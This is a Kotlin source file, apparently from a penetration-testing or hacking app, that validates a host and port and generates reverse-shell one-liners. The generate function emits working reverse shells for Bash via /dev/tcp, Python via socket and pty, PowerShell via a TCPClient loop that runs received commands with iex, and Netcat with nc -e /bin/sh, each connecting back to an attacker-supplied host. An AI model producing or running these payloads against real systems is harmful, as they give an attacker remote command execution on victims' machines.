package com.example.payloads

/** Reverse-shell targets the generator can emit. */
enum class PayloadEnvironment(val key: String, val label: String) {
  BASH("Bash", "Bash"),
  PYTHON("Python", "Python"),
  POWERSHELL("PowerShell", "PowerShell"),
  NETCAT("Netcat", "Netcat"),
  PING("Ping", "ICMP");

  companion object {
    fun fromKey(key: String): PayloadEnvironment =
      entries.firstOrNull { it.key == key } ?: BASH
  }
}

sealed interface HostValidation {
  data object Valid : HostValidation
  data object Empty : HostValidation
  data object Invalid : HostValidation
}

sealed interface PortValidation {
  data object Valid : PortValidation
  /** Blank, or not a number at all. */
  data object Empty : PortValidation
  data class OutOfRange(val port: Int) : PortValidation
}

object PayloadGenerator {

  private val IPV4 = Regex("""^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$""")
  private val HOSTNAME = Regex("""^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$""")

  /** Accepts an IPv4 literal or a syntactically valid hostname. */
  fun validateHost(host: String): HostValidation {
    if (host.isBlank()) return HostValidation.Empty
    val trimmed = host.trim()
    IPV4.matchEntire(trimmed)?.let { match ->
      val octets = (1..4).map { match.groupValues[it].toInt() }
      return if (octets.all { it in 0..255 }) HostValidation.Valid else HostValidation.Invalid
    }
    return if (HOSTNAME.matches(trimmed)) HostValidation.Valid else HostValidation.Invalid
  }

  fun validatePort(port: String): PortValidation {
    if (port.isBlank()) return PortValidation.Empty
    val value = port.toIntOrNull() ?: return PortValidation.Empty
    return if (value in 1..65535) PortValidation.Valid else PortValidation.OutOfRange(value)
  }

  /**
   * Builds the one-liner for [environment].
   *
   * When [host] or [port] is blank the literal `LHOST` / `LPORT` placeholders are
   * emitted, exactly as the previous implementation did, so an incomplete form
   * still shows a copyable template.
   */
  fun generate(environment: PayloadEnvironment, host: String, port: String): String {
    val h = host.ifBlank { "LHOST" }
    val p = port.ifBlank { "LPORT" }
    return when (environment) {
      PayloadEnvironment.BASH ->
        "bash -i >& /dev/tcp/$h/$p 0>&1"

      PayloadEnvironment.PYTHON ->
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$h\",$p));" +
          "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"

      PayloadEnvironment.POWERSHELL ->
        "\$c=New-Object Net.Sockets.TCPClient('$h',$p);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};" +
          "while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);" +
          "\$r=(iex \$d 2>&1|Out-String);\$s.Write(([text.encoding]::ASCII).GetBytes(\$r),0,\$r.Length)}"

      PayloadEnvironment.NETCAT ->
        "nc -e /bin/sh $h $p"

      PayloadEnvironment.PING ->
        "ping -c 4 $h"
    }
  }
}
